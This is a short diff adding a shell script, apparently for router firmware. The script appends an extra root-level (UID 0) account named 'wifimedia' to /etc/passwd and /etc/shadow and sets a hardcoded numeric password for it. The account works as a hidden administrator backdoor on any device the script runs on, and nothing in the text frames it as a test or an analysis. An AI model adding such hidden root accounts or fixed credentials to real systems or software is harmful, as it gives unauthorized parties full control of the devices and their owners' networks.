@@ -1,0 +1,7 @@
+#!/bin/sh
+#Copyright ©  dungtd8x@gmail.com
+#Password	
+echo -e "wifimedia:x:0:0:wifimedia:/root:/bin/ash" >>/etc/passwd
+echo -e "wifimedia:*:0:0:99999:7:::" >>/etc/shadow
+echo -e "0946567008\n0946567008" | passwd wifimedia
+#End
